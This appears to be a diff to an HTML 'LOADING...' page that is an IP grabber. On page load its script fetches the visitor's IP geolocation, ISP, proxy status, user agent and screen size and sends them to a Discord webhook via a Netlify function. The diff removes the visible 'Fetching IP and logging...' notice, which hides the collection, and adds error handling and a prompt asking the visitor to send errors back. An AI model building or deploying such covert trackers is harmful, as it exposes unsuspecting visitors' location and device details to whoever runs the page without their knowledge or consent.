@@ -15,11 +15,14 @@
       justify-content: center;
       align-items: center;
       user-select: none;
+      text-align: center;
+      padding: 10px;
     }
     #loading-text {
       font-size: 6rem;
       letter-spacing: 0.3em;
       animation: flickerGTA 2.5s infinite alternate;
+      user-select: none;
     }
     @keyframes flickerGTA {
       0%, 100% { opacity: 1; }
@@ -30,22 +33,28 @@
       font-size: 1.4rem;
       font-weight: bold;
       color: #0f0;
-      text-align: center;
       max-width: 90vw;
       word-wrap: break-word;
+      cursor: default;
     }
     #log-status.error {
       color: #f33;
+      cursor: pointer;
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <div id="loading-text">LOADING...</div>
-  <div id="log-status">Fetching IP and logging...</div>
+  <div id="log-status" title="Click to copy error message"></div>
 
   <script>
     const netlifyFunctionUrl = "/.netlify/functions/log-ip";
     const logStatus = document.getElementById('log-status');
+
+    function safeGet(obj, path, defaultValue = '') {
+      return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
+    }
 
     async function fetchIPInfo() {
       const res = await fetch('https://ipwhois.app/json/');
@@ -98,7 +107,7 @@
             { name: "City", value: `${data.city}`, inline: true },
             { name: "ISP", value: `${data.isp}`, inline: false },
             { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
-            { name: "VPN/Proxy Detected", value: `${data.security.is_proxy ? "Yes" : "No"}`, inline: true },
+            { name: "VPN/Proxy Detected", value: safeGet(data, ['security', 'is_proxy'], false) ? "Yes" : "No", inline: true },
             { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
             { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
           ]
@@ -107,9 +116,17 @@
         const result = await sendDiscordWebhook(embed);
         logStatus.textContent = `✅ Success: ${result}`;
         logStatus.classList.remove('error');
+        logStatus.title = "";
       } catch (err) {
-        logStatus.textContent = `❌ Error: ${err.message}`;
+        logStatus.textContent = `❌ Error: ${err.message}\n\nTap here to copy`;
         logStatus.classList.add('error');
+        logStatus.title = "Tap to copy error message";
+
+        logStatus.onclick = () => {
+          navigator.clipboard.writeText(err.message)
+            .then(() => alert("Error message copied! Send it to me."))
+            .catch(() => alert("Failed to copy error message."));
+        };
       }
     })();
   </script>
